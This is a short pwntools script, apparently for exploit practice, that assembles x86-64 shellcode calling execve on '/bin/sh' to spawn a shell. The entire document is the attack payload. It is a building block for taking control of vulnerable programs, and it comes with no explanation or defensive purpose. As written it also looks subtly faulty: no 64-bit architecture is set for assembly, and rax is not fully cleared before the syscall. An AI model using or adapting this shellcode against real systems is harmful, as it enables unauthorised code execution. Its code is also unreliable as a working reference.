from pwn import *

shellcode = """
jmp code

shell:
    .ascii "/bin/sh\\x00"     

code:
    xor rsi, rsi          
    xor rdx, rdx             
    lea rdi, [rip+shell]     
    mov al, 0x3b             
    syscall               
"""
print(asm(shellcode))
